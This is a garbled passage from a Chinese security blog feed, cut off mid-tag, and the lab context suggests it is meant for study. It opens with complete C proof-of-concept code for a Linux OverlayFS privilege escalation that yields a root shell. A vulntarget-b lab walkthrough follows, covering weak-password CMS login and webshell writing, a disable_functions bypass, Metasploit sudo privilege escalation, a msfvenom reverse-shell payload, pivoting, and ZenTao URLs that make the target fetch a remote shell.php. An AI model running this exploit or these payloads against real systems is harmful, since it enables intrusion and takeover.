<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a              æ˜¾ç¤ºç”µè„‘ä»¥åŠæ“ä½œç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯</span><br><span class="line">cat /etc/issue        æ˜¾ç¤ºå‘è¡Œç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">cat /proc/version     æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### EXP</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>

<br>

<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;err.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/mount.h&gt;</span><br><span class="line"></span><br><span class="line">//#include &lt;attr/xattr.h&gt;</span><br><span class="line">//#include &lt;sys/xattr.h&gt;</span><br><span class="line">int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define DIR_BASE    &quot;./ovlcap&quot;</span><br><span class="line">#define DIR_WORK    DIR_BASE &quot;/work&quot;</span><br><span class="line">#define DIR_LOWER   DIR_BASE &quot;/lower&quot;</span><br><span class="line">#define DIR_UPPER   DIR_BASE &quot;/upper&quot;</span><br><span class="line">#define DIR_MERGE   DIR_BASE &quot;/merge&quot;</span><br><span class="line">#define BIN_MERGE   DIR_MERGE &quot;/magic&quot;</span><br><span class="line">#define BIN_UPPER   DIR_UPPER &quot;/magic&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void xmkdir(const char *path, mode_t mode)</span><br><span class="line">&#123;</span><br><span class="line">    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)</span><br><span class="line">        err(1, &quot;mkdir %s&quot;, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void xwritefile(const char *path, const char *data)</span><br><span class="line">&#123;</span><br><span class="line">    int fd = open(path, O_WRONLY);</span><br><span class="line">    if (fd == -1)</span><br><span class="line">        err(1, &quot;open %s&quot;, path);</span><br><span class="line">    ssize_t len = (ssize_t) strlen(data);</span><br><span class="line">    if (write(fd, data, len) != len)</span><br><span class="line">        err(1, &quot;write %s&quot;, path);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void xcopyfile(const char *src, const char *dst, mode_t mode)</span><br><span class="line">&#123;</span><br><span class="line">    int fi, fo;</span><br><span class="line"></span><br><span class="line">    if ((fi = open(src, O_RDONLY)) == -1)</span><br><span class="line">        err(1, &quot;open %s&quot;, src);</span><br><span class="line">    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)</span><br><span class="line">        err(1, &quot;open %s&quot;, dst);</span><br><span class="line"></span><br><span class="line">    char buf[4096];</span><br><span class="line">    ssize_t rd, wr;</span><br><span class="line"></span><br><span class="line">    for (;;) &#123;</span><br><span class="line">        rd = read(fi, buf, sizeof(buf));</span><br><span class="line">        if (rd == 0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125; else if (rd == -1) &#123;</span><br><span class="line">            if (errno == EINTR)</span><br><span class="line">                continue;</span><br><span class="line">            err(1, &quot;read %s&quot;, src);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char *p = buf;</span><br><span class="line">        while (rd &gt; 0) &#123;</span><br><span class="line">            wr = write(fo, p, rd);</span><br><span class="line">            if (wr == -1) &#123;</span><br><span class="line">                if (errno == EINTR)</span><br><span class="line">                    continue;</span><br><span class="line">                err(1, &quot;write %s&quot;, dst);</span><br><span class="line">            &#125;</span><br><span class="line">            p += wr;</span><br><span class="line">            rd -= wr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fi);</span><br><span class="line">    close(fo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int exploit()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[4096];</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;rm -rf &#x27;%s/&#x27;&quot;, DIR_BASE);</span><br><span class="line">    system(buf);</span><br><span class="line"></span><br><span class="line">    xmkdir(DIR_BASE, 0777);</span><br><span class="line">    xmkdir(DIR_WORK,  0777);</span><br><span class="line">    xmkdir(DIR_LOWER, 0777);</span><br><span class="line">    xmkdir(DIR_UPPER, 0777);</span><br><span class="line">    xmkdir(DIR_MERGE, 0777);</span><br><span class="line"></span><br><span class="line">    uid_t uid = getuid();</span><br><span class="line">    gid_t gid = getgid();</span><br><span class="line"></span><br><span class="line">    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)</span><br><span class="line">        err(1, &quot;unshare&quot;);</span><br><span class="line"></span><br><span class="line">    xwritefile(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;);</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;0 %d 1&quot;, uid);</span><br><span class="line">    xwritefile(&quot;/proc/self/uid_map&quot;, buf);</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;0 %d 1&quot;, gid);</span><br><span class="line">    xwritefile(&quot;/proc/self/gid_map&quot;, buf);</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);</span><br><span class="line">    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) == -1)</span><br><span class="line">        err(1, &quot;mount %s&quot;, DIR_MERGE);</span><br><span class="line"></span><br><span class="line">    // all+ep</span><br><span class="line">    char cap[] = &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;</span><br><span class="line"></span><br><span class="line">    xcopyfile(&quot;/proc/self/exe&quot;, BIN_MERGE, 0777);</span><br><span class="line">    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) == -1)</span><br><span class="line">        err(1, &quot;setxattr %s&quot;, BIN_MERGE);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);</span><br><span class="line">        err(1, &quot;execl /bin/bash&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid_t child = fork();</span><br><span class="line">    if (child == -1)</span><br><span class="line">        err(1, &quot;fork&quot;);</span><br><span class="line"></span><br><span class="line">    if (child == 0) &#123;</span><br><span class="line">        _exit(exploit());</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        waitpid(child, NULL, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);</span><br><span class="line">    err(1, &quot;execl %s&quot;, BIN_UPPER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-bé¶æœº</title>
    <url>/posts/f33996e/</url>
    <content><![CDATA[<br>

<h3 id="æ‹“æ‰‘"><a href="#æ‹“æ‰‘" class="headerlink" title="æ‹“æ‰‘"></a>æ‹“æ‰‘</h3><br>

<p><img src="/posts/f33996e/1.png" alt="1.png"></p>
<br>

<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><h4 id="å¤–ç½‘æœºå™¨-centos7"><a href="#å¤–ç½‘æœºå™¨-centos7" class="headerlink" title="å¤–ç½‘æœºå™¨ centos7"></a>å¤–ç½‘æœºå™¨ centos7</h4><p><code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
<p><img src="/posts/f33996e/2.png" alt="æˆªå›¾"></p>
<br>

<p><code>systemctl restart networl</code></p>
<p><code>ifconfig</code>   ipä¸º <code>10.10.10.134</code></p>
<br>

<br>

<br>

<h3 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>nmap -sV 10.10.10.134</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ nmap 10.10.10.134 -sV</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 03:04 EDT</span><br><span class="line">Nmap scan report for 10.10.10.134</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 993 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">81/tcp   open  http    nginx</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    nginx</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds</span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>

<br>

<p>81ç«¯å£ æè‡´CMS</p>
<p>8888ç«¯å£ å®å¡”</p>
<p>80ç«¯å£ å°±ä¸€ä¸ªä¸»é¡µ dirsearchæ²¡æ‰«åˆ°ä¸œè¥¿</p>
<p>888ç«¯å£ 403</p>
<br>

<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Target: http://10.10.10.134:81/</span><br><span class="line"></span><br><span class="line">[03:10:56] Starting:                                                         </span><br><span class="line">[03:11:04] 200 -  479B  - /404.html                                         </span><br><span class="line">[03:11:04] 301 -  162B  - /A  -&gt;  http://10.10.10.134:81/A/                 </span><br><span class="line">[03:11:06] 403 -  548B  - /Public/                                          </span><br><span class="line">[03:11:12] 302 -    0B  - /admin.php  -&gt;  http://10.10.10.134:81/admin.php/Login/index.html</span><br><span class="line">[03:11:22] 301 -  162B  - /backup  -&gt;  http://10.10.10.134:81/backup/       </span><br><span class="line">[03:11:22] 403 -  548B  - /backup/                                          </span><br><span class="line">[03:11:24] 403 -  548B  - /cache/                                           </span><br><span class="line">[03:11:24] 301 -  162B  - /cache  -&gt;  http://10.10.10.134:81/cache/</span><br><span class="line">[03:11:32] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[03:11:36] 200 -  917B  - /index.html                                       </span><br><span class="line">[03:11:37] 200 -    0B  - /index.php/login/                                 </span><br><span class="line">[03:11:37] 200 -   14KB - /index.php                                        </span><br><span class="line">[03:11:37] 301 -  162B  - /install  -&gt;  http://10.10.10.134:81/install/     </span><br><span class="line">[03:11:37] 200 -   75B  - /install/index.php?upgrade/                       </span><br><span class="line">[03:11:37] 200 -   75B  - /install/</span><br><span class="line">[03:11:51] 200 -   22KB - /readme.txt                                       </span><br><span class="line">[03:11:51] 200 -  157B  - /robots.txt                                       </span><br><span class="line">[03:11:55] 200 -  490B  - /sitemap.xml                                      </span><br><span class="line">[03:11:57] 301 -  162B  - /static  -&gt;  http://10.10.10.134:81/static/       </span><br><span class="line">[03:12:02] 200 -  816B  - /web.config                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°åå°ç™»å½•ç‚¹ <code>admin.php</code> å¥½åƒé™¤äº†è¿™ä¸ª åˆ«çš„é¡µé¢éƒ½è®¿é—®ä¸äº†â€¦</p>
<p>å¼±å£ä»¤è¿›å…¥åå°â€¦ ï¼ˆåæ­£æˆ‘æ²¡è¯•å‡ºäº†/// ï¼‰ admin/admin123</p>
<p><img src="/posts/f33996e/3.png" alt="æˆªå›¾"></p>
<p>å‘ç°å½“å‰ç‰ˆæœ¬ä¸º v1.8.1 é€šè¿‡wapplyzerçœ‹åˆ°æ˜¯ nginx</p>
<br>

<h4 id="æ–‡ä»¶ä¸Šä¼ -å¤±è´¥"><a href="#æ–‡ä»¶ä¸Šä¼ -å¤±è´¥" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ (å¤±è´¥)"></a>æ–‡ä»¶ä¸Šä¼ (å¤±è´¥)</h4><p>åœ¨ç³»ç»Ÿè®¾ç½®-&gt;åŸºæœ¬è®¾ç½®-&gt;å…è®¸ä¸Šä¼ æ–‡ä»¶ç±»å‹  æ·»åŠ  phpåç¼€  ç„¶åå†å»æ‰¾ä¸€ä¸ªä¸Šä¼ ç‚¹</p>
<p>åœ¨ç½‘ç«™ç®¡ç†å¤„â€“&gt;è½®æ’­å›¾åˆ—è¡¨</p>
<p>å•†å“ç®¡ç†â€“&gt;å•†å“åˆ—è¡¨ </p>
<p><img src="/posts/f33996e/4.png" alt="æˆªå›¾"></p>
<p>ç„¶åæç¤ºä¸å…è®¸ä¸Šä¼  ï¼Œç”¨00æˆªæ–­è¿™ç±»çš„ éƒ½è¢«é‡å‘½åäº† æœ€ç»ˆè¿˜æ˜¯æ²¡ç»•è¿‡å»</p>
<p>å»ç½‘ä¸Šæ‰¾äº†ä¸‹æè‡´CMS1.8.1ç‰ˆæœ¬ç›¸å…³æ¼æ´ çœ‹åˆ°äº†è¿™ä¹ˆç¯‡æ–‡ç«  <a href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p>
<p>ä½¿ç”¨æ‹“å±•ç®¡ç†æ’ä»¶getshell</p>
<h4 id="æ¨¡æ¿ç¼–è¾‘æ’ä»¶Getshell"><a href="#æ¨¡æ¿ç¼–è¾‘æ’ä»¶Getshell" class="headerlink" title="æ¨¡æ¿ç¼–è¾‘æ’ä»¶Getshell"></a>æ¨¡æ¿ç¼–è¾‘æ’ä»¶Getshell</h4><p><img src="/posts/f33996e/5.png" alt="æˆªå›¾"></p>
<p>ç„¶åä½¿ç”¨è¿™ä¸ªåœ¨çº¿ç¼–è¾‘æ¨¡æ¿</p>
<p><img src="/posts/f33996e/6.png" alt="æˆªå›¾"></p>
<p>ç„¶åè®¾ç½®ä¸€ä¸ªå¯†ç  è¿™é‡Œè®¾ç½®ä¸º 123321 æäº¤åè¿›å…¥äº†ä»£ç ç¼–è¾‘å™¨</p>
<p><img src="/posts/f33996e/7.png" alt="æˆªå›¾"></p>
<p>ç„¶åå°±å¯ä»¥é€šè¿‡è¿™ä¸ªç¼–è¾‘å™¨å»æŸ¥çœ‹ä»£ç  å†™å…¥ä¸€å¥è¯</p>
<p>åœ¨index.phpå†™ä¸€ä¸ªphpinfo ç„¶åæˆåŠŸç”Ÿæ•ˆ</p>
<p><img src="/posts/f33996e/8.png" alt="æˆªå›¾"></p>
<p><img src="/posts/f33996e/9.png" alt="æˆªå›¾"></p>
<h4 id="disable-functionç»•è¿‡"><a href="#disable-functionç»•è¿‡" class="headerlink" title="disable_functionç»•è¿‡"></a>disable_functionç»•è¿‡</h4><p>è¿™æ ·å†™ä¸€ä¸ªä¸€å¥è¯ ç”¨èšå‰‘è¿ä¸€ä¸‹å°±å¯ä»¥äº†</p>
<p><img src="/posts/f33996e/10.png" alt="æˆªå›¾"></p>
<p>è¿ä¸Šèšå‰‘ä¹‹åæ²¡æ³•æ‰§è¡Œå‘½ä»¤ï¼Œçœ‹äº†ä¸‹phpinfo ç¦ç”¨äº†å¥½å¤šå‡½æ•° ä¹‹å‰æ‰«ç«¯å£çš„æ—¶å€™æ‰«åˆ°äº†æœ‰å®å¡”ï¼Œåº”è¯¥æ˜¯å®å¡”æŠŠå‡½æ•°ç»™ç¦æ‰äº†</p>
<p><img src="/posts/f33996e/11.png" alt="æˆªå›¾"></p>
<br>

<p>å°è¯•ä¸‹èšå‰‘ç»•è¿‡disable_functionçš„æ’ä»¶</p>
<p>ä½¿ç”¨è¿™ä¸ª<code>php7_GC_UAF</code> å¯ä»¥æˆåŠŸç»•è¿‡</p>
<p><img src="/posts/f33996e/12.png" alt="æˆªå›¾"></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>åé¢æ‹¿ç¬¬äºŒå°æœºå™¨shellçš„æ—¶å€™è¦åœ¨è¿™å°æœºå™¨ä¸Šèµ·ä¸€ä¸ªftpï¼Œæ™®é€šæƒé™èµ·ä¸æ¥ ç„¶åå°±è¿‡æ¥å°è¯•ä¸‹ææƒ</p>
<p>è¯•äº†ä¸‹ä¹‹å‰çˆ†å‡ºçš„ cve-2021-4034 ææƒæ²¡æˆåŠŸï¼Œæ‰¾ä¸‹msfè‡ªå¸¦çš„ææƒæ¨¡å—è¯•è¯•</p>
<p>MSFä¸“é—¨æä¾›äº†ä¸€ä¸ªæŸ¥æ‰¾é€‚ç”¨EXPçš„å†…ç½®æ¨¡å—<code>Local Exploit Suggester</code> ç„¶åç»™å‡ºäº†3ä¸ªå»ºè®®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; search suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester                                        </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use 0</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this modu</span><br><span class="line">                                               le on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed descript</span><br><span class="line">                                               ion for the available exploi</span><br><span class="line">                                               ts</span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                 Information           Connection</span><br><span class="line">  --  ----  ----                 -----------           ----------</span><br><span class="line">  2         meterpreter x64/lin  www @ localhost.loca  10.10.10.114:3344 -&gt;</span><br><span class="line">            ux                   ldomain (uid=1001, g   10.10.10.134:43556</span><br><span class="line">                                 id=1001, euid=1001,   (10.10.10.134)</span><br><span class="line">                                 egid=1001) @ loca...</span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.134 - Collecting local exploits for x64/linux...</span><br><span class="line">[*] 10.10.10.134 - 41 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªpkexec åˆšæ‰è¯•è¿‡äº†æ²¡æˆåŠŸï¼Œè¯•ä¸€ä¸‹sudoçš„è¿™ä¸ª</p>
<p><img src="/posts/f33996e/18.png"></p>
<p><img src="/posts/f33996e/19.png"></p>
<p><img src="/posts/f33996e/20.png"></p>
<p>è¿è¡Œå®Œæˆåå¯çœ‹åˆ°ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„rootè´¦æˆ·<code>msf</code> å¯†ç ä¸º <code>nyyqeegzvjyfqa</code> sshè¿ä¸€ä¸‹è¯•è¯•  </p>
<p>ç„¶åæˆåŠŸè¿ä¸Šssh æƒé™ä¸ºrootæƒé™ </p>
<p><img src="/posts/f33996e/21.png" alt="æˆªå›¾"></p>
<p>åœ¨rootç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªflag</p>
<p><img src="/posts/f33996e/22.png" alt="æˆªå›¾"></p>
<h3 id="æ¨ªå‘ç¬¬äºŒå°æœºå™¨"><a href="#æ¨ªå‘ç¬¬äºŒå°æœºå™¨" class="headerlink" title="æ¨ªå‘ç¬¬äºŒå°æœºå™¨"></a>æ¨ªå‘ç¬¬äºŒå°æœºå™¨</h3><p>ç›´æ¥ä¸Šmsf</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.114 lport=3344 -f elf &gt; 3344.elf</code></p>
<p><img src="/posts/f33996e/13.png" alt="æˆªå›¾"></p>
<br>

<p>å‘ç°æœ‰ä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªç½‘æ®µä¸º<code>10.10.10.0/24</code> (å…¬ç½‘ipä¸º 10.10.10.134)</p>
<p>å¦ä¸€ä¸ªä¸º <code>10.0.20.0/24</code> (å†…ç½‘ipä¸º10.0.20.30)</p>
<h4 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h4><p><code>meterpreter &gt;  run post/multi/manage/autoroute</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: linux)                                                                 </span><br><span class="line">[*] Running module against localhost.localdomain                             </span><br><span class="line">[*] Searching for subnets to autoroute.                                      </span><br><span class="line">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table. </span><br><span class="line">[+] Route added to subnet 10.10.10.0/255.255.255.0 from host&#x27;s routing table.</span><br></pre></td></tr></table></figure>

<h4 id="ç«¯å£æ‰«æ-1"><a href="#ç«¯å£æ‰«æ-1" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="/posts/f33996e/14.png" alt="æˆªå›¾">         </p>
<p>(æ‰«äº†å¥½ä¹…æ²¡æ‰«åˆ°ï¼Œçªç„¶æƒ³åˆ°æœºå™¨å¿˜è®°å¼€äº†â€¦ç¦»è°±)</p>
<p>ç›´æ¥æŒ‚ä»£ç† ç”¨proxychainsæ‰«</p>
<p><img src="/posts/f33996e/15.png" alt="æˆªå›¾"></p>
<p>åˆšæ‰ç”¨msfçš„portscanåªæ‰«åˆ°8080ï¼Œç”¨nmapæ‰«ä¸€ä¸‹</p>
<p><code>proxychains nmap -sV 10.0.20.66</code> æ‰«äº†20åˆ†é’Ÿ</p>
<p><img src="/posts/f33996e/16.png" alt="æˆªå›¾"></p>
<p>åˆå‘ç°äº†3306ç«¯å£</p>
<br>

<p>ç„¶åä½¿ç”¨æµè§ˆå™¨æŒ‚ä»£ç†è®¿é—® 10.0.20.66:8080 æ˜¯ä¸ªç¦…é“cms</p>
<p><img src="/posts/f33996e/17.png" alt="æˆªå›¾"></p>
<p>æŸ¥çœ‹æºç  å‘ç°æ˜¯ ç¦…é“v12.4.2 æ‰¾ä¸‹å¯¹åº”æ¼æ´</p>
<p>ä¸‹ç­äº† æ—©ç‚¹å›å» æ˜å¤©å†æâ€¦</p>
<hr>
<p>åœ¨ç½‘ä¸Šæ‰¾äº†ä¸‹ åªæ‰¾åˆ°äº†è¯¥ç‰ˆæœ¬çš„åå°getshellï¼Œåªèƒ½å°è¯•å¼±å£ä»¤ç™»å½•åå°äº†â€¦</p>
<p><img src="/posts/f33996e/23.png" alt="æˆªå›¾"></p>
<p>å°è¯•5æ¬¡è‡ªåŠ¨é”äº†â€¦ç„¶åæˆ‘çœ‹äº†ä¸‹wp,å‘ç°è´¦å·å¯†ç æ˜¯ <code>admin</code>/<code>Admin123</code> ç„¶åå»è¯•è¿˜æ˜¯ç™»å½•å¤±è´¥â€¦(æœ¬åœ°æ²¡ç™»ä¸Šå» kaliç™»ä¸Šå»äº† æ— è¯­â€¦)</p>
<h4 id="ZenTao-åå°getshell-å¤±è´¥"><a href="#ZenTao-åå°getshell-å¤±è´¥" class="headerlink" title="ZenTao åå°getshell(å¤±è´¥)"></a>ZenTao åå°getshell(å¤±è´¥)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### Exp</span><br><span class="line">http://127.0.0.1/zentao/client-download-1-&lt;base64 encode webshell download link&gt;-1.html</span><br><span class="line">http://127.0.0.1/zentao/data/client/1/&lt;download link filename&gt;</span><br></pre></td></tr></table></figure>

<p> éœ€è¦åœ¨å¤–ç½‘æœºå™¨ä¸Šèµ·ä¸€ä¸ªftpæœåŠ¡ </p>
<p><code>python -m pyftpdlib -p 21 -d .</code> ä½†æ˜¯ç°åœ¨æ˜¯æ™®é€šç”¨æˆ· ä¸çŸ¥é“æƒé™å¤Ÿä¸å¤Ÿ</p>
<p>èšå‰‘ä¼ ä¸€ä¸ªshell.phpçš„ä¸€å¥è¯ </p>
<p>shellåœ°å€ <code>ftp://10.0.20.30/shell.php</code>   </p>
<p>base64 <code>ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA=</code></p>
<p>æ„å»ºexp </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.20.66:8080/client-download-1-ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA==-1.html</span><br></pre></td></tr></table></figure>

<p>è®¿é—®å404 åº”è¯¥æ˜¯å¤–ç½‘æœºå™¨æƒé™å¤ªä½ éœ€è¦ææƒä¸€ä¸‹ï¼Œå†å›åˆ°å¤–ç½‘æœºå™¨è¿›è¡Œææƒ</p>
<br>

<hr>
<p>æåˆ°rootå å†å›æ¥æ‰“è¿™ä¸ªexp æ‰“ç®—èµ·ä¸€ä¸ªftpæœåŠ¡ ä½†æ˜¯æ²¡æœ‰è¿™ä¸ªåº“ è€Œä¸”ä¹Ÿæ²¡å®‰è£…pip </p>
<p>é‚£å°±è€ƒè™‘ä½¿ç”¨httpå»æ</p>
<p>shellåœ°å€ <code>http://10.0.20.30:6688/shell.php</code></p>
<p>base64 <code>aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
<p>æ„é€ exp <code>http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=  </span><br><span class="line"># ç¬¬ä¸€ä¸ªç›´æ¥404</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDo5Njk2L3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/client-download-1-SFRUUDovLzEwLjAuMjAuMzM6NDU2Ny8xLnBocA==-1.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/client-download-1-MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==-1.html  404</span><br><span class="line">http://127.0.0.1/zentao/data/client/1/shell.php</span><br><span class="line"></span><br><span 